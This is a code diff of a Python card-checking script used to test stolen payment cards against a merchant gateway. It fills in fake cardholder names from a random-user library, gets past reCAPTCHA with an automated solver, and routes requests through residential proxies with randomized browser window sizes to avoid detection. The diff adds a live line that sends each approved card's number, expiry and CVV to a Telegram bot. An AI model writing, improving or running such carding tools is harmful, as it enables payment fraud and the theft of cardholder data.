@@ -12,6 +12,7 @@ import re
 import time
 import json
 import psutil
+from gates.utils.browser_profile import generate_profile
 # from .gates.utils.browser_profile import generate_profile
 error_response = ['Invalid merchant information: 57-Terminal is not programmed for this service - call Customer Support',
                   'captchaError',
@@ -68,6 +69,11 @@ def find_between(data, first, last):
 def final(jmsg, servdt5, cookies, token, proxies, cc):
     user = RandomUser()
     name = user.get_full_name()
+    pattern = r'[^A-Za-z0-9 ]+'
+    matches = re.findall(pattern, name)
+    while matches:
+       user = RandomUser()
+       name = user.get_full_name()
     fname = user.get_first_name()
     lname = user.get_last_name()
     street = user.get_street()
@@ -111,10 +117,21 @@ def final(jmsg, servdt5, cookies, token, proxies, cc):
     }
 
     payload = f"jmsg={jmsg}&exact_cardholder_name={fname}+{lname}&servdt5={servdt5}&merchant=WSP-ACCES-o7E%26lQDhTA&x_card_num={ccn}&x_exp_date={mm}{yy2}&x_card_code={cvv}&cvd_presence_ind=1&x_address={street}&x_city=asdas&x_state=California&x_zip=90001&x_country=United+States&x_email={email}&g-recaptcha-response={token}"
-
+    
     response = requests.post(reqUrl, data=payload,  headers=headersList, cookies=cookies_dict, proxies=proxies)
-    return response.text
-
+    print(response.status_code)
+    try:
+        if response:
+            # print(response.text)
+            if 'id="Transaction_Approved" value="YES"' in response.text:
+                return {"status": "Approved"}
+            else:
+                return response
+        else:
+            return False
+    except:
+        print(response.text)
+        return response
 
 
 
@@ -130,7 +147,9 @@ async def solve(url, p, ua, user_data_dir):
     GEONODE_DNS = f"http://premium-residential.geonode.com:{port}"
 
     async with async_playwright() as playwright:
-        
+        # resolution = random.choice["800,1280", "907,512", "960,600", "962,601", "1024,600", "1024,640"]  
+        y_axis = random.randint(480, 1024)
+        x_axis = random.randint(720, 1024)
         args = [
             "--deny-permission-prompts",
             "--no-default-browser-check",
@@ -140,9 +159,9 @@ async def solve(url, p, ua, user_data_dir):
             "--no-service-autorun",
             f"--user-agent={ua}",
             "--headless=new",  # the new headless arg for chrome v109+. Use '--headless=chrome' as arg for browsers v94-108.
-            "--window-size=640,480",
+            f"--window-size={y_axis},{x_axis}",
         ]
-
+          
         # proxy = {"server": p}   
         proxy = {"server": GEONODE_DNS, "username": username, "password": password}
         context = await playwright.firefox.launch_persistent_context(
@@ -210,12 +229,16 @@ async def solve(url, p, ua, user_data_dir):
             page.set_default_navigation_timeout(50000)
             async with recaptchav2.AsyncSolver(page) as solver:
                 await page.wait_for_timeout(3000)
-                token = await solver.solve_recaptcha(attempts=1)
-                print(token)
-                await page.wait_for_timeout(3000)
+                try :
+                    token = await solver.solve_recaptcha(attempts=1)
+                    print(token)
+                    await page.wait_for_timeout(3000)
+                except:
+                    pass
             cookies = await page.context.cookies()
             await page.close()
             await context.close()
+            time.sleep(2)
             return jmsg, servdt5, cookies, token
     
         except RecaptchaSolveError as reError:
@@ -223,6 +246,7 @@ async def solve(url, p, ua, user_data_dir):
             print(f"Captcha Error: {reError}")
             await page.close()
             await context.close()
+           
             # return "captchaError"
         # except:
         #     await page.close()
@@ -282,9 +306,8 @@ def process_check(cc, p, reqUrl, ua, user_data_dir):
         jmsg, servt5, cookie, token = gResponse
         response = final(jmsg, servt5, cookie, token, p)
         if response:
-                
                 return response
-            
+ 
         # if gResponse:
         #     print(reqver)
         #     print(donotion)
@@ -337,7 +360,7 @@ def process_check(cc, p, reqUrl, ua, user_data_dir):
             # if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data or "Approved" in data:
             #     requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
         
-            # # respo = await get_response(navigate)
+            # respo = await get_response(navigate)
 
             # print(data)
             
@@ -351,11 +374,10 @@ def process_all(cc, profile):
     tries = 0
     limit = 10
     while proces != "Done" and tries <= limit:
+        tries = tries + 1
         time.sleep(1)  # import time
         p=get_enumproxy()
         reqUrl = getUrl()
-        if tries >= 5:
-            profile = generate_profile()
         print(profile)
         ua = UserAgent()
         ua = ua['Firefox']
@@ -363,17 +385,23 @@ def process_all(cc, profile):
         if gResponse:
             jmsg, servt5, cookie, token = gResponse
             response = final(jmsg, servt5, cookie, token, p, cc)
-            if response:
-                    AVS = find_between(str(response), 'name="AVS" id="AVS" value="', '"')
-                    message = find_between(str(response), 'id="Bank_Message" value="', '"')
-                    rescode = find_between(str(response), 'name="Bank_Resp_Code" id="Bank_Resp_Code" value="', '"')
-                    return {"rescode": rescode, "message": message, "AVS": AVS}
+            if 'id="Transaction_Error" value="false"' in response.text:
+                    if 'id="Transaction_Approved" value="YES"' in response.text:
+                        requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
+                        return {'rescode': '100', 'message': 'Approved', 'AVS': 'X'}
+                    else:
+                        AVS = find_between(str(response.text), 'name="AVS" id="AVS" value="', '"')
+                        message = find_between(str(response.text), 'id="Bank_Message" value="', '"')
+                        rescode = find_between(str(response.text), 'id="Bank_Resp_Code" value="', '"')
+                        return {"rescode": rescode, "message": message, "AVS": AVS}
+        else:
+            profile = generate_profile()
         # errormsg = find_between(result, '"error_message":"','"')
         # if errormsg not in error_response:
         #     proces = "Done"
         # else:
         #     proces = "Not Done"
-    return result
+    # return response
     
 # respo = process_all("5115000041839763|12|2024|068", "tmp/profile_data_dir")
 # print(respo)
